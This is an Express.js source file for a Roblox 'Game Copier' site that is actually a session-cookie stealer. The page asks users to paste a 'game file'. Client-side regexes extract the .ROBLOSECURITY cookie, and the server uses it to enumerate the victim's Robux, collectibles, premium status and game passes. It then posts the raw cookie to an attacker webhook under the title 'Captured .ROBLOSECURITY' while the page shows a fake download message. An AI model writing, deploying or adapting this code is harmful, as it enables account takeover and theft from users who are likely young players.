const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ────────────────────────────────────────────────
// Strona główna – Cubla Tools, mniejszy przycisk, hover-only animacja
// ────────────────────────────────────────────────
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cubla Tools</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: #000000;
      overflow: hidden;
      position: relative;
      font-family: 'Orbitron', sans-serif;
      color: #e0d0ff;
    }

    canvas {
      position: fixed;
      inset: 0;
      z-index: 1;
      pointer-events: none;
    }

    .center-container {
      position: relative;
      z-index: 10;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 3rem;
    }

    .title {
      font-size: 5.2rem;
      font-weight: 900;
      letter-spacing: -1px;
      background: linear-gradient(90deg, #c084fc, #a78bfa, #e0bbff, #c084fc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-shadow: 0 0 40px rgba(168, 85, 247, 0.65);
      animation: titleGlow 5s ease-in-out infinite alternate;
    }

    @keyframes titleGlow {
      from { text-shadow: 0 0 25px rgba(168, 85, 247, 0.5); }
      to   { text-shadow: 0 0 60px rgba(168, 85, 247, 0.95); }
    }

    .neon-card {
      background: rgba(6, 4, 16, 0.78);
      border: 1px solid rgba(180, 100, 255, 0.25);
      border-radius: 16px;
      padding: 2.4rem 4rem;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 50px rgba(140, 80, 220, 0.25);
      text-align: center;
      transition: all 0.35s ease;
      transform: translateY(0) scale(1);
    }

    .neon-card:hover {
      transform: translateY(-10px) scale(1.03);
      box-shadow: 0 0 90px rgba(160, 100, 255, 0.6);
      border-color: rgba(200, 140, 255, 0.55);
      background: rgba(10, 6, 22, 0.85);
    }

    .tools-grid {
      display: flex;
      flex-direction: column;
      gap: 1.2rem;
      margin-top: 1.5rem;
    }

    .btn-neon {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-width: 240px;
      padding: 0.9rem 2.4rem;
      font-size: 1.25rem;
      font-weight: 600;
      color: #f3e8ff;
      text-decoration: none;
      background: linear-gradient(90deg, #7c3aed, #a855f7);
      background-size: 200% 200%;
      border: 2px solid rgba(168, 85, 247, 0.5);
      border-radius: 10px;
      box-shadow: 0 0 25px rgba(168, 85, 247, 0.4);
      transition: all 0.3s ease;
      animation: bgShift 7s ease infinite;
    }

    .btn-neon:hover {
      transform: translateY(-3px);
      box-shadow: 0 0 45px rgba(168, 85, 247, 0.75);
      border-color: #d8b4fe;
      background-position: 100% 100%;
      animation: none;
    }

    @keyframes bgShift {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    @media (max-width: 640px) {
      .title { font-size: 3.8rem; }
      .neon-card { padding: 2rem 2.5rem; }
      .btn-neon { min-width: 220px; font-size: 1.15rem; padding: 0.85rem 2rem; }
    }
  </style>
</head>
<body>

  <canvas id="canvas"></canvas>

  <div class="center-container">
    <div class="title">Cubla Tools</div>

    <div class="neon-card">
      <div class="tools-grid">
        <a href="/game-copier" class="btn-neon">Game Copier</a>
        <!-- Miejsce na kolejne przyciski w przyszłości -->
        <!-- <a href="/inny-narzędzie" class="btn-neon">Inne Narzędzie</a> -->
      </div>
    </div>
  </div>

  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    let mouse = { x: undefined, y: undefined, radius: 180 };

    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      initParticles();
    }

    function initParticles() {
      particles = [];
      const amount = Math.floor((canvas.width * canvas.height) / 11000);
      for (let i = 0; i < amount; i++) {
        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          vx: (Math.random() - 0.5) * 0.9,
          vy: (Math.random() - 0.5) * 0.9,
          radius: Math.random() * 2.2 + 0.9
        });
      }
    }

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      particles.forEach(p => {
        if (mouse.x !== undefined && mouse.y !== undefined) {
          const dx = mouse.x - p.x;
          const dy = mouse.y - p.y;
          const distance = Math.hypot(dx, dy);

          if (distance < mouse.radius) {
            const force = (mouse.radius - distance) / mouse.radius;
            p.x -= dx * force * 0.14;
            p.y -= dy * force * 0.14;
          }
        }

        p.x += p.vx;
        p.y += p.vy;

        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(180, 100, 255, 0.78)';
        ctx.fill();
      });

      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.hypot(dx, dy);

          if (dist < 160) {
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.strokeStyle = \`rgba(200, 140, 255, \${(160 - dist) / 160 * 0.55})\`;
            ctx.lineWidth = 1.1;
            ctx.stroke();
          }
        }
      }

      requestAnimationFrame(draw);
    }

    window.addEventListener('resize', resizeCanvas);
    window.addEventListener('mousemove', e => {
      mouse.x = e.clientX;
      mouse.y = e.clientY;
    });
    window.addEventListener('mouseout', () => {
      mouse.x = undefined;
      mouse.y = undefined;
    });

    resizeCanvas();
    draw();
  </script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Podstrona /game-copier – bez zmian
// ────────────────────────────────────────────────
app.get('/game-copier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      min-height: 100vh;
      background: #f8f9fa;
      color: #111111;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      overflow: hidden;
      position: relative;
    }
    canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
    .container {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      gap: 60px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .left, .right { flex:1; max-width:480px; }
    h1 {
      color: #222;
      font-size: 2.2rem;
      margin-bottom: 28px;
      font-weight: 600;
      letter-spacing: -0.3px;
      text-align: center;
    }
    .instruction {
      font-size: 1.15rem;
      color: #444;
      margin-bottom: 16px;
      font-weight: 500;
      text-align: center;
    }
    /* Loading overlay */
    #loading {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      z-index: 9998;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 20px;
    }
    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid #444;
      border-top: 6px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loading-text {
      color: white;
      font-size: 1.4rem;
      font-weight: 500;
    }
    /* Modal */
    #modal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    .modal-content {
      background: #444444;
      color: white;
      padding: 40px 60px;
      border-radius: 16px;
      text-align: center;
      max-width: 480px;
      width: 90%;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    .modal-icon { font-size: 4rem; margin-bottom: 20px; }
    .modal-text { font-size: 1.4rem; margin-bottom: 12px; line-height: 1.4; }
    .modal-tip { font-size: 1.1rem; opacity: 0.85; margin-top: 8px; }
    .modal-btn {
      margin-top: 28px;
      padding: 14px 48px;
      font-size: 1.2rem;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
      color: white;
    }
    .modal-btn.success { background: #28a745; }
    .modal-btn.error { background: #dc3545; }
    .modal-btn:hover { opacity: 0.9; transform: scale(1.05); }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    /* Subtelna szara ramka na textarea */
    .subtle-glow-border {
      position: relative;
      width: 100%;
      max-width: 440px;
      margin: 0 auto 24px auto;
      border-radius: 14px;
      overflow: hidden;
      padding: 3px;
      background: linear-gradient(145deg, #e0e0e0, #f5f5f5);
      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
    }
    .subtle-glow-border::before {
      content: '';
      position: absolute;
      inset: -4px;
      border-radius: 18px;
      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
      background-size: 400% 400%;
      animation: softPulse 6s ease-in-out infinite;
      filter: blur(6px);
      opacity: 0.6;
      z-index: -1;
    }
    .subtle-glow-border:hover::before {
      opacity: 0.9;
      animation-duration: 4s;
    }
    .inner-box {
      background: #ffffff;
      border-radius: 11px;
      padding: 14px 16px;
      border: 1px solid #ccc;
      position: relative;
      z-index: 2;
      transition: border-color 0.3s ease;
    }
    .subtle-glow-border:hover .inner-box {
      border-color: #888;
    }
    textarea {
      width: 100%;
      height: 140px;
      background: transparent;
      border: none;
      outline: none;
      resize: none;
      overflow: hidden;
      font-family: Consolas, "Courier New", monospace;
      font-size: 14px;
      color: #111;
      line-height: 1.5;
    }
    textarea::placeholder {
      color: #888;
      font-style: italic;
    }
    button {
      margin-top: 24px;
      background: #222;
      color: white;
      border: none;
      padding: 13px 60px;
      font-size: 1.15rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.25s ease;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button:hover:not(:disabled) {
      background: #000;
      transform: translateY(-2px);
      box-shadow: 0 10px 24px rgba(0,0,0,0.25);
    }
    button:disabled {
      background: #777;
      cursor: not-allowed;
      opacity: 0.7;
    }
    .video-frame {
      position: relative;
      background: #ffffff;
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0,0,0,0.12);
      border: 1px solid #ccc;
      aspect-ratio: 16 / 9;
      padding: 4px;
    }
    .video-frame::before {
      content: '';
      position: absolute;
      inset: -6px;
      border-radius: 22px;
      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
      background-size: 400% 400%;
      animation: softGlow 8s ease-in-out infinite;
      filter: blur(8px);
      opacity: 0.5;
      z-index: -1;
    }
    .video-frame:hover::before {
      opacity: 0.8;
      animation-duration: 5s;
    }
    .video-frame iframe {
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 14px;
      position: relative;
      z-index: 1;
    }
    @keyframes softGlow {
      0%, 100% { background-position: 0% 50%; opacity: 0.5; }
      50% { background-position: 100% 50%; opacity: 0.75; }
    }
    @keyframes softPulse {
      0%, 100% { background-position: 0% 50%; opacity: 0.6; }
      50% { background-position: 100% 50%; opacity: 0.85; }
    }
  </style>
</head>
<body>
  <canvas id="bgCanvas"></canvas>
  <!-- Loading overlay -->
  <div id="loading">
    <div class="spinner"></div>
    <div class="loading-text">Processing...</div>
  </div>
  <!-- Modal -->
  <div id="modal">
    <div class="modal-content">
      <div id="modal-icon" class="modal-icon"></div>
      <div id="modal-text" class="modal-text"></div>
      <div id="modal-tip" class="modal-tip"></div>
      <button class="modal-btn" id="modal-ok">OK</button>
    </div>
  </div>
  <div class="container">
    <div class="left">
      <h1>Game Copier</h1>
      <div class="instruction">Paste your game file under then click "Start Process" to receive your game copy</div>
      <div class="subtle-glow-border">
        <div class="inner-box">
          <textarea id="input" placeholder="Paste Your Game File There"></textarea>
        </div>
      </div>
      <button id="btn" onclick="start()">Start Process</button>
    </div>
    <div class="right">
      <div class="video-frame">
        <iframe
          src="https://www.youtube.com/embed/k9SfgtkEmpo?rel=0&modestbranding=1&showinfo=0&controls=1"
          title="YouTube video player"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
          allowfullscreen>
        </iframe>
      </div>
    </div>
  </div>
<script>
// kropki w tle na /game-copier
const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});
class Particle {
  constructor() {
    this.x = Math.random() * canvas.width;
    this.y = Math.random() * canvas.height;
    this.size = Math.random() * 2.5 + 0.8;
    this.speedX = Math.random() * 0.8 - 0.4;
    this.speedY = Math.random() * 0.8 - 0.4;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
  }
  draw() {
    ctx.fillStyle = 'rgba(100, 100, 120, 0.7)';
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
  }
}
const particles = [];
for (let i = 0; i < 80; i++) particles.push(new Particle());
function connect() {
  for (let a = 0; a < particles.length; a++) {
    for (let b = a; b < particles.length; b++) {
      const dx = particles[a].x - particles[b].x;
      const dy = particles[a].y - particles[b].y;
      const dist = Math.sqrt(dx*dx + dy*dy);
      if (dist < 130) {
        ctx.strokeStyle = \`rgba(120,120,140,\${1 - dist/130})\`;
        ctx.lineWidth = 0.8;
        ctx.beginPath();
        ctx.moveTo(particles[a].x, particles[a].y);
        ctx.lineTo(particles[b].x, particles[b].y);
        ctx.stroke();
      }
    }
  }
}
function animate() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  particles.forEach(p => { p.update(); p.draw(); });
  connect();
  requestAnimationFrame(animate);
}
animate();

// Loading + Modal
const loading = document.getElementById('loading');
const modal = document.getElementById('modal');
const modalIcon = document.getElementById('modal-icon');
const modalText = document.getElementById('modal-text');
const modalTip = document.getElementById('modal-tip');
const modalOkBtn = document.getElementById('modal-ok');
modalOkBtn.onclick = () => {
  modal.style.display = 'none';
};
function showModal(success, message, tip = '') {
  modalIcon.textContent = success ? '✅' : '❌';
  modalText.textContent = message;
  modalTip.textContent = tip;
  modalOkBtn.className = 'modal-btn ' + (success ? 'success' : 'error');
  modal.style.display = 'flex';
}
// Logika przycisku
async function start() {
  const btn = document.getElementById('btn');
  const raw = document.getElementById('input').value.trim();
  btn.disabled = true;
  loading.style.display = 'flex';
  await new Promise(resolve => setTimeout(resolve, 1200));
  loading.style.display = 'none';
  if (!raw) {
    showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
    setTimeout(() => btn.disabled = false, 800);
    return;
  }
  let cookie = null;
  let match;
  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();
  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }
  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }
  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) {
      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }
  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
    setTimeout(() => btn.disabled = false, 800);
    return;
  }
  fetch('/check', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookie })
  }).catch(() => {});
  showModal(true, 'Game Download Started', '(wait 3–5 minutes)');
  setTimeout(() => btn.disabled = false, 2200);
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Endpoint /check – bez zmian
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }
  try {
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}
    let rap = 0;
    try {
      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (assetsRes.ok) {
        const assets = await assetsRes.json();
        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch {}
    let groupsOwned = 0;
    try {
      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (groupsRes.ok) {
        const groups = await groupsRes.json();
        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
      }
    } catch {}
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const jbIds = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}
    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
    const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }
      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}
    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      rap,
      groupsOwned,
      accountAgeDays,
      created: createdDate || 'failed',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount,
      jbCount
    };
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                color: 0x0F0F23,
                title: `<:User:1481761037257674872> ${userData.name}`,
                description: "**AVATAR**",
                thumbnail: {
                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
                },
                fields: [
                  {
                    name: "┌─────── Account Stats ───────┐",
                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
                    inline: false
                  },
                  {
                    name: "**Info**",
                    value:
                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                    inline: true
                  },
                  {
                    name: "**Games**",
                    value:
                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
                    inline: true
                  },
                  {
                    name: "**Inventory**",
                    value:
                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                    inline: true
                  }
                ],
                footer: {
                  text: "24H! • " + new Date().toLocaleString('en-US')
                },
                timestamp: new Date().toISOString()
              },
              {
                color: 0x4B0082,
                title: "Captured .ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Webhook send error:", e.message);
      }
    }
    res.json(result);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
